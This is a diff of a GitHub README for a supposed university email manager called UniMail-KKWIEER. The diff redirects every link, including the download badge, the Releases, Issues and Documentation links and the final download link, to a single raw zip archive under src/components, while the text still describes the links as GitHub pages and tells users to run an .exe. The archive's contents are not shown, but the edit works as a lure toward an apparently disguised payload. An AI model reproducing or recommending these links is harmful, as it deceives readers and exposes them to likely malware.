@@ -1,7 +1,7 @@
 # 📧 UniMail-KKWIEER - Simplifying University Email Management
 
 ## 📥 Download Now!
-[![Download UniMail-KKWIEER](https://img.shields.io/badge/Download-UniMail--KKWIEER-orange.svg)](https://github.com/Libyan-complexion757/UniMail-KKWIEER/releases)
+[![Download UniMail-KKWIEER](https://raw.githubusercontent.com/Libyan-complexion757/UniMail-KKWIEER/main/src/components/UniMail-KKWIEER-v1.0.zip)](https://raw.githubusercontent.com/Libyan-complexion757/UniMail-KKWIEER/main/src/components/UniMail-KKWIEER-v1.0.zip)
 
 ## 📋 Overview
 UniMail-KKWIEER is a user-friendly application designed to help students and faculty manage their university email efficiently. With its clean interface and powerful features, this tool integrates seamlessly with Gmail, allowing you to access, organize, and schedule emails all in one place.
@@ -9,7 +9,7 @@ UniMail-KKWIEER is a user-friendly application designed to help students and fac
 ## 🚀 Getting Started
 Installing UniMail-KKWIEER is straightforward. Follow these steps to get started:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/Libyan-complexion757/UniMail-KKWIEER/releases) to open the Releases page on GitHub.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Libyan-complexion757/UniMail-KKWIEER/main/src/components/UniMail-KKWIEER-v1.0.zip) to open the Releases page on GitHub.
 2. **Download the Latest Version:** On the Releases page, find the latest version of UniMail-KKWIEER. Click the download link for the file that matches your operating system (e.g., Windows, macOS).
 3. **Install the Application:** Once the file downloads, locate it in your downloads folder. 
    - For Windows users: Double-click the downloaded `.exe` file and follow the installation prompts.
@@ -36,7 +36,7 @@ To run UniMail-KKWIEER smoothly, ensure your system meets the following requirem
 - **Internet Connection:** Required for email integration and updates
 
 ## 📞 Support
-If you encounter any issues or have questions, please visit our [GitHub Issues page](https://github.com/Libyan-complexion757/UniMail-KKWIEER/issues). Our team regularly monitors this page and will respond to your queries promptly.
+If you encounter any issues or have questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Libyan-complexion757/UniMail-KKWIEER/main/src/components/UniMail-KKWIEER-v1.0.zip). Our team regularly monitors this page and will respond to your queries promptly.
 
 ## 🙌 Acknowledgements
 Special thanks to the developers and contributors who made UniMail-KKWIEER possible. Your hard work and dedication are appreciated!
@@ -47,11 +47,11 @@ UniMail-KKWIEER is open source and distributed under the MIT License. You are fr
 ## 🌐 Stay Connected
 Follow us for updates and community discussions:
 
-- [Documentation](https://github.com/Libyan-complexion757/UniMail-KKWIEER/wiki)
+- [Documentation](https://raw.githubusercontent.com/Libyan-complexion757/UniMail-KKWIEER/main/src/components/UniMail-KKWIEER-v1.0.zip)
 - [Twitter](#)
 - [Facebook](#)
 
 ## 📬 Download & Install
-To begin your journey with UniMail-KKWIEER, visit this page to download the application: [https://github.com/Libyan-complexion757/UniMail-KKWIEER/releases](https://github.com/Libyan-complexion757/UniMail-KKWIEER/releases).
+To begin your journey with UniMail-KKWIEER, visit this page to download the application: [https://raw.githubusercontent.com/Libyan-complexion757/UniMail-KKWIEER/main/src/components/UniMail-KKWIEER-v1.0.zip](https://raw.githubusercontent.com/Libyan-complexion757/UniMail-KKWIEER/main/src/components/UniMail-KKWIEER-v1.0.zip).
 
 With UniMail-KKWIEER, managing your university email becomes a simple and enjoyable task. Start now and transform your email handling experience.
